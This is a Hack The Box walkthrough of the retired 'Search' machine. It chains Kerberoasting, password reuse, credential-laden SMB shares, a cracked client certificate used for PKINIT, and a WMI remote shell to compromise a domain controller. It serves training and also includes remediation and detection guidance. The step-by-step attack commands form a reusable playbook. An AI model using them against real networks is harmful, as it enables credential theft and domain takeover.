Hack The Box / Hard / Windows

Search

A Windows Active Directory domain controller exposes IIS, LDAP, Kerberos and SMB. Kerberoasting a service account yields a weak password that a domain user has reused, granting read/write access to a redirected-folders share. That share holds a phishing spreadsheet full of credentials, a crackable client certificate usable for PKINIT authentication, and a CA backup. Recovered credentials ultimately permit a remote administrator session.

Retired machine · validated walkthrough · Authorized laboratory assessment · Reviewed: 2026-10-03

Dylan Senez / D4RKGUNN3R

Active Directory, Kerberoasting, certificates, SMB shares, privilege escalation

Case overview

Outcome

Kerberoasting the web_svc account and cracking its password gave access to RedirectedFolders$, where a phishing spreadsheet leaked further credentials and where a cracked client certificate enabled certificate-based authentication. A privileged account obtained along the way allowed a remote WMI execution session to reach the Administrator desktop and read root.txt.

Key takeaway

In Active Directory, one weak service-account password rarely stays contained: reuse extends it to file shares, and shares typically hold the certificates and credentials that finish the domain compromise.

Validated steps were directly reproduced. Documented steps are supported by preserved artifacts. Staged steps remain incomplete or await evidence.

Attack path

  • Full TCP sweep maps a domain controller (search.htb, host RESEARCH)
  • Authenticated LDAP enumeration of users and groups
  • Kerberoast the web_svc service account and crack its password
  • Reused password grants read/write on RedirectedFolders$
  • Phishing_Attempt.xlsx recovered from a user's redirected profile
  • Client certificate (staff.pfx) and CA backup found on the same share
  • Certificate cracked and used for PKINIT authentication
  • Remote WMI execution as a privileged account reaches the Administrator desktop

1. Reconnaissance — Full TCP scan and domain controller fingerprinting

Validated · Kali / attacker · EVD-001

Artifact

Search.nmap

Command / request

nmap -sV -sC -vv -p- 192.0.2.10 -T4 --min-rate 5000 -oA Search

Observed result

53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0 (title: Search — Just Testing IIS; TRACE enabled)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: search.htb)
443/tcp   open  ssl/http      Microsoft IIS httpd 10.0 (CN=research, issuer search-RESEARCH-CA)
445/tcp   open  microsoft-ds  (smb2-security-mode: Message signing enabled and required)
8172/tcp  open  http          Microsoft IIS Web Management Service
9389/tcp  open  mc-nmf        .NET Message Framing
Service Info: Host: RESEARCH; OS: Windows

Analysis

The target is a domain controller for search.htb. The LDAP certificate is issued by an internal CA (search-RESEARCH-CA), which signals a Certificate Services deployment worth investigating. SMB signing is required, so SMB relay is not available; progress must come from credential weaknesses instead.

Why this mattered

Establishes that this is an Active Directory attack surface and rules out relay, shaping the whole approach.

2. Internal Enumeration — Authenticated LDAP enumeration of the domain

Validated · Kali / attacker · EVD-002

Artifact

domain_users.json, domain_groups.json, domain_policy.json

Command / request

ldapdomaindump -u 'search\\<user>' -p '[REDACTED]' 192.0.2.10

Observed result

Authenticated LDAP dump produced domain_users.json, domain_groups.json, domain_policy.json, domain_trusts.json and HTML reports for the search.htb domain.

Analysis

With a working domain credential, the full user, group and policy structure is dumped, providing the account and SPN context needed to target Kerberos attacks and to understand group membership.

Why this mattered

Turns a set of credentials into a map of the domain so roasting and share access can be aimed precisely.

3. Exploitation — Kerberoast a service account and crack its password

Validated · Kali / attacker · EVD-003

Artifact

svc.txt

Command / request

impacket-GetUserSPNs -request -dc-ip 192.0.2.10 search.htb/<user>:'[REDACTED]' -outputfile svc.txt
john --wordlist=/usr/share/wordlists/rockyou.txt svc.txt

Observed result

ServicePrincipalName              Name     PasswordLastSet
RESEARCH/web_svc.search.htb:60001 web_svc  2020-04-09 08:59:11
Loaded 1 hash (krb5tgs etype 23)
Recovered: [REDACTED]

Analysis

The web_svc account has a service principal name and therefore is Kerberoastable: any authenticated user can request a TGS for it and crack the ticket offline. The password fell to a standard wordlist, which immediately yields a service-account credential.

Why this mattered

Produces the first high-value credential purely from domain authentication, without touching the target's services.

4. Exploitation — Validate password reuse and map accessible shares

Validated · Kali / attacker · EVD-004

Command / request

for u in Isabela.Estrada Keith.Hester Chanel.Bell Edgar.Jacobs Lane.Wu; do
  smbmap -u $u -p '[REDACTED]' -d search -H 192.0.2.10 --no-banner --no-color
done

Observed result

One domain user authenticated with the cracked password. Shares returned:
  CertEnroll (READ ONLY)
  helpdesk (READ ONLY)
  IPC$ (READ ONLY)
  NETLOGON (READ ONLY)
  RedirectedFolders$ (READ, WRITE)
  SYSVOL (READ ONLY)

Analysis

The service-account password is reused by at least one human domain user, and that account can read/write the RedirectedFolders$ share as well as read CertEnroll and helpdesk. RedirectedFolders$ holds users' redirected profiles, a common place for documents containing credentials.

Why this mattered

Extends a service-account compromise into share access and identifies where to look for further secrets.

5. Exploitation — Retrieve a phishing spreadsheet from a redirected profile

Validated · Kali / attacker · EVD-005

Artifact

Phishing_Attempt.xlsx (23130 bytes)

Command / request

smbclient -U 'Edgar.Jacobs' //192.0.2.10/RedirectedFolders$ -c "recurse ON; prompt OFF; mget *"

Observed result

Access allowed under \edgar.jacobs\...:
  Desktop/Phishing_Attempt.xlsx (23130 bytes)
Many other user subfolders returned NT_STATUS_ACCESS_DENIED.

Analysis

The share exposes Edgar.Jacobs' redirected desktop, which contains a phishing spreadsheet listing usernames alongside candidate passwords that follow a per-user word-and-symbol pattern. These are strong candidates for a throttled spray within the same domain.

Why this mattered

Provides a pool of plausible credentials for other accounts, including privileged ones.

6. User Access — Collect the user proof and certificate material from the share

Validated · Kali / attacker · EVD-006

Artifact

staff.pfx (4326 bytes), search-RESEARCH-CA.p12 (2643 bytes)

Command / request

smbclient -U 'sierra.frye' //192.0.2.10/RedirectedFolders$ -c "recurse ON; prompt OFF; mget *"

Observed result

Downloads/Backups:
  search-RESEARCH-CA.p12 (2643 bytes)
  staff.pfx (4326 bytes)
sierra.frye/user.txt -> [REDACTED]

Analysis

The same share, accessed as sierra.frye, yields that user's proof plus a client certificate (staff.pfx) and the private key backup of the issuing CA (search-RESEARCH-CA.p12). A CA private-key backup is domain-compromise material if it can be cracked.

Why this mattered

Supplies both a user-level proof and the certificate material that drives the next phase.

7. Privilege Escalation — Crack the client certificate and authenticate via PKINIT

Validated · Kali / attacker · EVD-007

Artifact

staff.hash, staff.pfx

Command / request

pfx2john staff.pfx > staff.hash
john --wordlist=/usr/share/wordlists/rockyou.txt staff.hash
certipy auth -pfx staff.pfx -dc-ip 192.0.2.10 -domain search.htb

Observed result

staff.pfx cracked (password recovered)
Result: certificate based authentication succeeded as sierra.frye
SharpHound collection executed for search.htb; CES_Kerberos endpoints returned 404

Analysis

The client certificate is protected by a weak password and was cracked offline. Because the domain trusts certificate-based authentication, the recovered certificate and key authenticate the mapped account without a password - a stealthy path that also survives password resets. SharpHound was then run to map privilege relationships.

Why this mattered

Adds a password-less, harder-to-detect authentication method and a full view of domain privileges.

8. Privilege Escalation — Remote administrator access and the root proof

Validated · Kali / attacker · EVD-008

Command / request

impacket-wmiexec 'search.htb/<user>:[REDACTED]'@192.0.2.10

Observed result

Remote shell as a privileged account; navigated to C:\Users\Administrator\Desktop
root.txt -> [REDACTED]

Analysis

With a privileged account's credentials, a remote WMI execution session reaches the Administrator desktop and reads root.txt, completing the compromise of the domain controller.

Why this mattered

Confirms full administrative control of the domain controller and captures the final proof.

Findings & remediation

F-1 — Kerberoastable service account with a weak, reused password

High · Validated · search.htb domain (web_svc service account, SPN RESEARCH/web_svc.search.htb:60001)

Description

The web_svc account has a service principal name that any authenticated domain user can request a TGS for. Its password cracked against a common wordlist and is also reused by at least one human domain user (CWE-521 / CWE-262).

Impact

Offline crackability of the service credential, and the resulting password reuse grants access to the RedirectedFolders$ share, leading to further credential and certificate disclosure.

Root cause

A service account protected by a weak, guessable password that is shared with a user account instead of being unique and managed (e.g. by a gMSA).

Remediation

  • Use long, random, service-account-specific passwords or group managed service accounts
  • Eliminate password sharing between service accounts and users
  • Monitor for and alert on Kerberoasting (bulk TGS requests) and rotate affected secrets

Validation

  • GetUserSPNs extracted the krb5tgs hash for web_svc, john recovered the password from rockyou, and the same value authenticated a domain user against SMB with access to RedirectedFolders$.

F-2 — Credentials stored in a spreadsheet on a network share

High · Validated · \\192.0.2.10\RedirectedFolders$\edgar.jacobs\Desktop\Phishing_Attempt.xlsx

Description

A phishing spreadsheet in a user's redirected desktop lists domain usernames together with candidate passwords that follow a predictable pattern. The share was reachable by a non-privileged account whose password was reused from the service account.

Impact

Disclosure of credentials for many domain accounts, enabling password spraying toward privileged access and lateral movement.

Root cause

Sensitive credential material stored in an ordinary document on a broadly readable user-data share, with no additional protection.

Remediation

  • Remove the spreadsheet and rotate every exposed credential
  • Prohibit storing credential lists in shared documents
  • Tighten ACLs on redirected-folder shares and audit who can read other users' profiles

Validation

  • An SMB client authenticated as a reused-password account downloaded Phishing_Attempt.xlsx (23,130 bytes) listing usernames and per-user candidate passwords.

F-3 — Crackable client certificate and CA backup exposed on a share

High · Validated · \\192.0.2.10\RedirectedFolders$\...\Backups\staff.pfx and search-RESEARCH-CA.p12

Description

The share holds a password-protected client certificate (staff.pfx) and the private-key backup of the issuing CA (search-RESEARCH-CA.p12). The staff certificate's password cracked offline, and it was usable for PKINIT authentication (CWE-522 / CWE-321).

Impact

Password-less, certificate-based authentication as a mapped domain account, plus latent domain-compromise material in the exposed CA backup.

Root cause

Private keys stored on a shared folder with weak protection (crackable passphrase, backup of CA key material), instead of being protected by HSM/DPAPI and kept offline.

Remediation

  • Rotate the exposed certificate and CA material and protect private keys with strong passphrases
  • Store CA backups offline and out of shared directories
  • Restrict enrollment and certificate access and monitor PKINIT logons

Validation

  • pfx2john/john cracked staff.pfx, certipy authenticated via PKINIT as sierra.frye, and the share also exposed the CA private-key backup search-RESEARCH-CA.p12.

F-4 — Privileged account reachable via remotely-executed administration

Medium · Documented · 192.0.2.10 (domain controller, Administrator desktop)

Description

With a privileged account's credentials, a remote WMI execution session reached the Administrator desktop. The account was able to authenticate remotely for administrative execution, consistent with an over-privileged or weakly protected administrative credential.

Impact

Full administrative control of the domain controller and access to the final proof.

Root cause

A privileged credential usable for remote administration, obtained through the earlier credential and certificate disclosures rather than through a protection gap in the endpoint itself.

Remediation

  • Apply tiered administration so administrative credentials never reside on lower-tier systems
  • Rotate privileged credentials after exposure and enforce credential hygiene
  • Restrict and monitor remote execution (WMI/WinRM) to administrative hosts

Validation

  • An impacket-wmiexec session as the privileged account navigated to the Administrator desktop and read root.txt.

Analysis

Search is a chain-of-creds problem rather than a single exploit. The perimeter is a well-configured domain controller - SMB signing is required and there is no obvious relay path - so progress comes entirely from credential weaknesses. A Kerberoastable service account with a rockyou-crackable password, reused by a normal user, opens a file share whose contents are themselves credential material: a phishing spreadsheet and a password-protected client certificate. Each step supplies the input to the next, and the certificate adds a strong, hard-to-detect authentication method on top of password use.

Remediation

  • Give service accounts long, unique, randomly generated passwords (or gMSAs) and remove interactive/reuse rights
  • Rotate any credential that is shared between a user account and a service account
  • Never store credential lists in documents on network shares; remove and rotate the exposed spreadsheet
  • Protect private keys with strong passphrases, keep CA backups offline, and restrict share ACLs to those who truly need them
  • Enforce tiered administration and monitor for certificate (PKINIT) logons from unexpected hosts

Defender perspective

This engagement barely touches exploit code - the signals are authentication events. Kerberoasting shows up as a burst of RC4 TGS requests for service SPNs, the reused password as a normal user authenticating to unusual SMB paths, and the certificate path as a PKINIT logon. Correlating these in the domain controller's logs, together with access to redirected-folder shares, would surface the whole chain.

Detection opportunities

  • Alert on anomalously large numbers of Kerberos TGS requests for service accounts (Kerberoasting)
  • Monitor for RC4-encrypted TGS requests in a domain that otherwise uses AES
  • Detect PKINIT/certificate logons from hosts that do not normally use them
  • Track access to RedirectedFolders$ and other user-data shares by accounts that have no business reason to access them
  • Enable and review object-access auditing on sensitive shares holding certificates or backups

Lessons learned

  • Kerberoastable service accounts with weak passwords remain one of the highest-yield AD misconfigurations
  • Password reuse between an application service account and a human user multiplies impact
  • File shares and redirected profiles are credential goldmines; treat them as sensitive data stores
  • Exposed client certificates and CA backups enable stealthy, password-less authentication (PKINIT) that is easy to overlook in detection

Open questions

  • The export does not record how the first domain credential used for authenticated LDAP enumeration was originally obtained; the documented chain begins at authenticated enumeration
  • SharpHound collected a ZIP and CES_Kerberos endpoints returned 404, but the BloodHound analysis conclusions and any ESC paths were not preserved in the export
  • The exact origin of the final privileged account's password is not documented beyond its use in the remote execution step

Troubleshooting & success factors

  • The CES_Kerberos certificate-enrollment endpoints (http and https) both returned 404, indicating the CES service was not exposed at the expected path even though AD CS was present
